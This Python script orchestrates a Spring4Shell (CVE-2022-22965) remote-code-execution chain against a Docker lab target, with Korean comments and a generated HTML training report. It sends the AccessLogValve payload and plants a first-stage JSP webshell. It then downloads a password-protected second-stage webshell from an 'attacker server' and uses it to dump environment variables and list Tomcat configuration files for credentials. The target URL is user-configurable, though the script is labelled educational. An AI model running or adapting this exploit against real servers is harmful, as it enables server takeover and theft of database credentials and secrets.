"""
run.py
Spring4Shell (CVE-2022-22965) - Docker Local Environment
Educational Use Only

Steps:
    STEP 1. Spring4Shell payload (AccessLogValve manipulation)
    STEP 2. Tomcat log flush
    STEP 3. Verify yaho4.jsp creation (up to 5 retries)
    STEP 4. Deploy health_check.jsp
            [A] curl via host.docker.internal
            [B] fallback: docker cp
    STEP 5. Verify health_check.jsp
    STEP 6. Unit tests
"""

import urllib.request
import urllib.parse
import urllib.error
import subprocess
import time
import sys
import os
import datetime

try:
    from stage1_dropper import ExploitConfig, Spring4ShellPayloadGenerator, ExploitController
    from stage2_uploader import UploadConfig, LocalFileServerAdapter, Stage1CommandAdapter, Stage2UploadUseCase
except ImportError as e:
    print(f"\n[ERROR] {e}")
    print("       stage1_dropper.py, stage2_uploader.py must be in the same folder.\n")
    sys.exit(1)


def header(title):
    print()
    print("=" * 60)
    print(f"  {title}")
    print("=" * 60)

def ok(msg):   print(f"  [OK]   {msg}")
def fail(msg): print(f"  [FAIL] {msg}")
def info(msg): print(f"  [*] {msg}")
def warn(msg): print(f"  [!] {msg}")
def step(n, title):
    print(f"\n{'=' * 60}")
    print(f"  STEP {n}. {title}")
    print(f"{'=' * 60}")


def base_url(url):
    parsed = urllib.parse.urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def http_get(url):
    try:
        res = urllib.request.urlopen(url, timeout=5)
        return res.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return -1


def check_shell(url):
    try:
        res = urllib.request.urlopen(url, timeout=8)
        raw = res.read().decode("utf-8", errors="ignore").strip()

        # 2단계 웹쉘(health_check.jsp)은 HTML을 반환하므로 <pre> 태그 안의 실행결과만 추출
        if "<pre>" in raw and "</pre>" in raw:
            import re
            match = re.search(r"<pre>(.*?)</pre>", raw, re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 1단계 웹쉘(yaho4.jsp)은 명령어 결과 뒤에 " // - try{..." 같은 로그 찌꺼기가 붙어 나옴
        # 첫 번째 라인만 추출하여 반환
        lines = raw.split("\n")
        if lines:
            return lines[0].strip()
            
        return raw
    except Exception as e:
        return f"[FAIL] {e}"


def detect_spring_container(default="cvepratice-spring-1"):
    try:
        out = subprocess.check_output(["docker", "ps", "--format", "{{.Names}}"], text=True)
        for line in out.strip().split("\n"):
            name = line.strip()
            if name and "spring" in name.lower() and "db" not in name.lower():
                return name
    except Exception:
        pass
    return default


def main():
    print()
    print("=" * 60)
    print("  Spring4Shell Exploit Runner  (CVE-2022-22965)")
    print("  Docker Local Environment  |  Educational Use Only")
    print("=" * 60)

    header("Configuration")
    print()
    print("  Press Enter to use default values (localhost:8011).")
    print()

    DEFAULT_BASE     = "http://localhost:8011"
    DEFAULT_ENDPOINT = "/spring-form/login"
    DEFAULT_SHELL    = "yaho4"

    base_input     = input(f"  [?] Target Base URL  (default: {DEFAULT_BASE}): ").strip()
    BASE           = base_input.rstrip("/") if base_input else DEFAULT_BASE

    endpoint_input = input(f"  [?] Attack Endpoint  (default: {DEFAULT_ENDPOINT}): ").strip()
    ENDPOINT       = endpoint_input if endpoint_input else DEFAULT_ENDPOINT

    shell_input    = input(f"  [?] Stage1 Shell Name (default: {DEFAULT_SHELL}): ").strip()
    SHELL_NAME     = shell_input if shell_input else DEFAULT_SHELL

    TARGET_URL   = f"{BASE}{ENDPOINT}"
    FLUSH_URL    = TARGET_URL
    STAGER_URL   = f"{BASE}/{SHELL_NAME}.jsp"
    STAGE2_URL   = f"{BASE}/health_check.jsp?pwd=glory&cmd=id"
    ATTACKER_URL = "http://host.docker.internal:9090"

    print()
    print("  Target URL     :", TARGET_URL)
    print("  Stage1 Shell   :", STAGER_URL)
    print("  Stage2 Shell   :", STAGE2_URL)
    print("  Attacker Server:", ATTACKER_URL, "(Docker internal)")
    print()
    input("  [Enter] Start exploit...")

    results = {}

    # STEP 1
    step(1, "Spring4Shell Payload Transmission (AccessLogValve Manipulation)")

    config    = ExploitConfig(target_url=TARGET_URL, filename=SHELL_NAME)
    generator = Spring4ShellPayloadGenerator(config)
    controller = ExploitController(generator)
    success = controller.run_exploit(TARGET_URL)

    if success:
        ok("Payload sent successfully.")
    else:
        fail("Payload failed. Check network or target URL.")

    results["step1"] = success
    if not success:
        sys.exit(1)

    # STEP 2
    step(2, "Tomcat Log Flush (write webshell to disk)")

    info(f"Sending GET {FLUSH_URL}")
    code = http_get(FLUSH_URL)
    info(f"Response code: {code}")
    ok("Flush complete. Waiting for yaho4.jsp creation...")
    results["step2"] = True
    time.sleep(2)

    # STEP 3
    step(3, f"Verify Stage1 Shell ({SHELL_NAME}.jsp) - max 5 retries")

    stager_ok = False
    for attempt in range(1, 6):
        result = check_shell(f"{STAGER_URL}?cmd=whoami")
        info(f"  [{attempt}/5] {SHELL_NAME}.jsp?cmd=whoami -> {result[:60]}")

        if result and "404" not in result and "FAIL" not in result and "Error" not in result:
            ok(f"Stage1 shell confirmed! User: {result.strip()[:40]}")
            stager_ok = True
            break

        warn(f"Not yet. Re-sending payload and flush ({attempt}/5)...")
        controller.run_exploit(TARGET_URL)
        for _ in range(3):
            http_get(FLUSH_URL)
            time.sleep(1)
        time.sleep(2)

    if not stager_ok:
        warn(f"{SHELL_NAME}.jsp not found. Will try docker cp in STEP 4.")

    results["step3"] = stager_ok

    # STEP 4
    step(4, "Deploy Stage2 Shell (health_check.jsp)")

    deploy_ok = False

    # Method A: curl via host.docker.internal
    if stager_ok:
        info("[A] Trying curl download via host.docker.internal...")
        upload_config = UploadConfig(
            stager_url       = STAGER_URL,
            stage2_file      = "health_check.jsp",
            local_serve_port = 9090,
            target_save_dir  = "/usr/local/tomcat/webapps/ROOT",
            attacker_url     = ATTACKER_URL,
        )
        file_server = LocalFileServerAdapter()
        executor    = Stage1CommandAdapter()
        use_case    = Stage2UploadUseCase(file_server, executor, upload_config)
        use_case.run()
        time.sleep(2)

        check_a = check_shell(f"{BASE}/health_check.jsp?pwd=glory&cmd=id")
        if "root" in check_a or "uid=" in check_a:
            ok("[A] curl download successful! health_check.jsp deployed.")
            deploy_ok = True
        else:
            warn("[A] curl failed. Switching to docker cp...")
    else:
        warn("Stage1 shell not available. Trying docker cp directly...")

    # Method B: docker cp (automatic fallback)
    if not deploy_ok:
        info("[B] Trying docker cp...")
        container = detect_spring_container()
        info(f"    Detected container: {container}")

        src  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "health_check.jsp")
        dest = f"{container}:/usr/local/tomcat/webapps/ROOT/health_check.jsp"
        cmd  = ["docker", "cp", src, dest]

        info(f"    Command: {' '.join(cmd)}")
        try:
            subprocess.run(cmd, check=True)
            ok("[B] docker cp successful! health_check.jsp deployed.")
            deploy_ok = True
        except subprocess.CalledProcessError:
            fail("[B] docker cp failed. Check if container is running.")
            info("    Manual: docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/")

    results["step4"] = deploy_ok

    # STEP 5
    step(5, "Verify Stage2 Shell (health_check.jsp)")

    info(f"Access URL: {STAGE2_URL}")
    result2 = check_shell(STAGE2_URL)
    info(f"Response: {result2}")

    if "root" in result2 or "uid=" in result2:
        ok(f"Stage2 shell working! Result: {result2.strip()}")
        results["step5"] = True
    else:
        warn("Stage2 shell response unexpected.")
        info(f"Check manually: {STAGE2_URL}")
        results["step5"] = False

    # STEP 6
    step(6, "Threat Demonstration (Post-Exploitation)")
    
    env_result = ""
    ls_result = ""
    if results.get("step5", False):
        info("Executing 'env' to extract environment variables...")
        env_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=env"
        env_result = check_shell(env_url)
        
        info("Executing 'ls -la /usr/local/tomcat/conf' to show sensitive files...")
        ls_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=ls%20-la%20/usr/local/tomcat/conf"
        ls_result = check_shell(ls_url)
        
        if env_result and ls_result and "[FAIL]" not in env_result:
            ok("Threat demonstration successful. Sensitive data extracted.")
            results["step6"] = True
        else:
            warn("Threat demonstration failed.")
            results["step6"] = False
    else:
        warn("Skipped Threat Demonstration because Stage2 shell is not verified.")
        results["step6"] = False

    # ══════════════════════════════════════════════════════════
    # 최종 결과 요약
    # ══════════════════════════════════════════════════════════
    header("Result Summary")
    print()

    labels = {
        "step1": "STEP 1 | Payload Transmission",
        "step2": "STEP 2 | Tomcat Log Flush",
        "step3": f"STEP 3 | Stage1 ({SHELL_NAME}.jsp) Verified",
        "step4": "STEP 4 | Stage2 Deployed (curl or docker cp)",
        "step5": "STEP 5 | Stage2 (health_check.jsp) Verified",
        "step6": "STEP 6 | Threat Demonstration (Info Leakage)",
    }

    all_pass = True
    for key, label in labels.items():
        passed = results.get(key, False)
        icon   = "[OK]" if passed else "[XX]"
        print(f"  {icon}  {label}")
        if not passed:
            all_pass = False

    print()
    if all_pass:
        print("  [SUCCESS] All steps passed! Spring4Shell RCE exploit complete.")
    else:
        print("  [WARNING] Some steps failed. Check the results above.")

    print()
    print(f"  Stage1 URL : {STAGER_URL}?cmd=id")
    print(f"  Stage2 URL : {BASE}/health_check.jsp?pwd=glory&cmd=id")

    # ══════════════════════════════════════════════════════════
    # 브라우저용 HTML 보고서 생성
    # ══════════════════════════════════════════════════════════
    now = datetime.datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")

    html_content = f"""
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>Spring4Shell 모의해킹 실습 결과 보고서</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }}
            .container {{ max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }}
            h1 {{ color: #e74c3c; text-align: center; border-bottom: 2px solid #eee; padding-bottom: 10px; }}
            h2 {{ color: #2c3e50; margin-top: 30px; }}
            .summary {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin-bottom: 30px; }}
            .step {{ margin-bottom: 20px; padding: 15px; border-left: 5px solid #bdc3c7; background: #fafafa; }}
            .step.success {{ border-left-color: #2ecc71; }}
            .step.fail {{ border-left-color: #e74c3c; }}
            .badge-success {{ background: #2ecc71; color: white; padding: 3px 8px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
            .badge-fail {{ background: #e74c3c; color: white; padding: 3px 8px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
            pre {{ background: #2d2d2d; color: #f8f8f2; padding: 10px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; margin-top: 5px; }}
            .footer {{ text-align: center; margin-top: 40px; color: #7f8c8d; font-size: 0.9em; }}
            .desc {{ color: #555; line-height: 1.5; margin-bottom: 15px; }}
            .res-box {{ background-color: #f9f9f9; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🛡️ Spring4Shell (CVE-2022-22965) 실습 보고서 <br><span style="font-size: 0.6em; color: #7f8c8d;">({current_time})</span></h1>
            
            <div class="summary">
                <h2>실습 개요</h2>
                <p class="desc">
                    본 보고서는 <strong>Spring4Shell 취약점(CVE-2022-22965)</strong>을 이용한 원격 코드 실행(Remote Code Execution) 실습 과정을 시간 순서대로 기록한 안내서입니다.<br>
                    공격이 어떻게 진행되고, 어떤 결과물을 얻어 서버 권한을 장악하는지 초보자도 쉽게 이해할 수 있도록 상세히 설명합니다.
                </p>
                <p><strong>실행 일시:</strong> {current_time}</p>
                <p><strong>공격 대상(타겟) 서버 주소:</strong> <a href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
                <p><strong>최종 실습 결과:</strong> {'<span class="badge-success">전체 성공</span>' if all_pass else '<span class="badge-fail">부분 실패</span>'}</p>
                <p><strong>생성된 최종 웹쉘 주소:</strong> <a href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
            </div>

            <h2>단계별 상세 실행 기록</h2>
    """

    step_descriptions = {
        "step1": "Spring Framework의 보안 취약점을 이용해, 서버(Tomcat)의 로그 기록 방식을 조작하는 악성 페이로드(공격 데이터)를 타겟 서버에 전송합니다.<br>이 설정이 적용되면 서버는 향후 발생하는 에러 로그를 <code>yaho4.jsp</code>라는 웹쉘 파일 형태로 저장하게 됩니다.",
        "step2": "앞서 메모리 상에 조작해둔 로그 설정이 물리적인 파일(디스크)로 저장되도록 유도하기 위해 서버에 평범한 형태의 접속 요청을 보냅니다.<br>이 과정이 끝나면 1단계 기초 웹쉘 파일이 타겟 서버 내부에 생성됩니다.",
        "step3": "저장된 1단계 웹쉘(<code>yaho4.jsp</code>)을 통해 타겟 서버 내부에 <code>whoami</code> (현재 접속중인 시스템 사용자 확인) 명령을 전송해 봅니다.<br>명령어에 대한 올바른 응답(root 등)이 반환된다면 취약점 공격이 성공적으로 작동하여 서버 명령 제어권을 획득한 것입니다.",
        "step4": "1단계 웹쉘은 1줄짜리 제한적인 코드이므로, 보다 강력하고 사용하기 편리한 2단계 완성형 웹쉘(<code>health_check.jsp</code>) 파일을 추가로 업로드합니다.<br>이 스크립트는 Docker 내부 네트워크를 통해 다운로드 방식(curl) 또는 도커 내 파일 복사 방식(docker cp)을 사용해 안전하게 배포됩니다.",
        "step5": "성공적으로 업로드된 2단계 완성형 웹쉘에 접근하여 <code>id</code> (사용자 시스템 권한 상세 조회) 명령을 전송합니다.<br>최종적으로 깔끔한 UI 화면과 함께 서버 응답이 확인되었다면, 시스템 권한 장악 실습이 완벽하게 끝났음을 의미합니다.",
        "step6": "<span style='color: #e74c3c;'><strong>⚠️ [보안 테스트: DB 정보 유출 시뮬레이션]</strong></span> 개발자 관점에서 취약점의 파급력을 점검하는 단계입니다.<br>Spring4Shell로 서버 권한을 얻은 공격자는 보통 DB 데이터를 직접 뽑아내기 전에, 가장 먼저 <strong>DB 접속 아이디와 비밀번호</strong>가 기록된 시스템 환경 변수나 설정 파일을 훔칩니다.<br>아래 결과는 공격자가 어떻게 웹쉘을 이용해 DB 비밀번호가 숨겨져 있을 수 있는 서버 내부 정보(환경 변수 로그 및 설정 파일 폴더)를 통째로 빼내는지 보여줍니다."
    }

    for key, label in labels.items():
        passed = results.get(key, False)
        status_class = "success" if passed else "fail"
        badge = '<span class="badge-success">성공</span>' if passed else '<span class="badge-fail">실패</span>'
        
        desc = step_descriptions.get(key, "")
        
        detail = ""
        if key == "step3" and passed:
            detail = f"<div class='res-box'><strong>[원격 실행 결과: whoami]</strong><pre>{check_shell(f'{STAGER_URL}?cmd=whoami')}</pre></div>"
        elif key == "step5" and passed:
            detail = f"<div class='res-box'><strong>[원격 실행 결과: id]</strong><pre>{check_shell(STAGE2_URL)}</pre></div>"
        elif key == "step6" and passed:
            detail = f"""<div class='res-box' style='border: 1px solid #e74c3c; background-color: #fff0f0;'>
                <p style="color: #c0392b; margin-top: 0; margin-bottom: 15px; font-size: 1.1em;"><strong>🚨 실제 데이터 탈취 위협 증명 (개발자 관점)</strong></p>
                
                <p style="margin-bottom: 5px; color: #333;"><strong>1. 서버 환경 변수 (env) 일괄 탈취 결과</strong><br>
                <span style="font-size: 0.9em; color: #555;">- 실무에서는 도커 환경변수 등으로 DB 비밀번호나 API 서버 키를 주입하곤 합니다. 이렇게 서버 권한이 뚫리면 아래와 같이 모든 환경 변수가 평문으로 고스란히 유출됩니다.</span></p>
                <pre style='max-height: 250px; border-left: 4px solid #c0392b;'>{env_result}</pre>
                
                <p style="margin-top: 20px; margin-bottom: 5px; color: #333;"><strong>2. 주요 설정 파일 폴더 (Tomcat conf) 무단 조회 결과</strong><br>
                <span style="font-size: 0.9em; color: #555;">- 앱의 데이터베이스 계정 정보가 적혀 있는 설정 파일들이 존재하는 폴더(conf) 공간을 무단으로 읽은 모습입니다. 파일 이름만 확인하면 공격자는 곧바로 그 안의 DB 아이디/비밀번호를 빼내어 외부에서 DB를 직접 털어갈 수 있습니다.</span></p>
                <pre style='max-height: 200px; border-left: 4px solid #c0392b;'>{ls_result}</pre>
            </div>"""
        elif not passed and key in ["step3", "step4", "step5", "step6"]:
            detail = f"<div class='res-box' style='border-color: #e74c3c; color: #e74c3c;'><strong>[오류 안내]</strong> 해당 단계 수행 중 문제가 발생했습니다.</div>"

        html_content += f"""
            <div class="step {status_class}">
                <h3>{badge} {label}</h3>
                <p class="desc">{desc}</p>
                {detail}
            </div>
        """

    html_content += """
            <div class="footer">
                <p>본 실습 결과 보고서는 모의해킹 교육 목적으로 <strong>run.py</strong> 스크립트에 의해 자동 생성되었습니다.<br> 
                모든 권한 없는 시스템 침투는 엄격히 금지됩니다.</p>
            </div>
        </div>
    </body>
    </html>
    """

    report_filename = f"report_{now.strftime('%Y%m%d_%H%M%S')}.html"
    with open(report_filename, "w", encoding="utf-8") as rf:
        rf.write(html_content)
        
    print(f"  [📄 HTML 보고서 생성] 현재 폴더의 {report_filename} 파일을 열어보세요!")

    print()


if __name__ == "__main__":
    main()
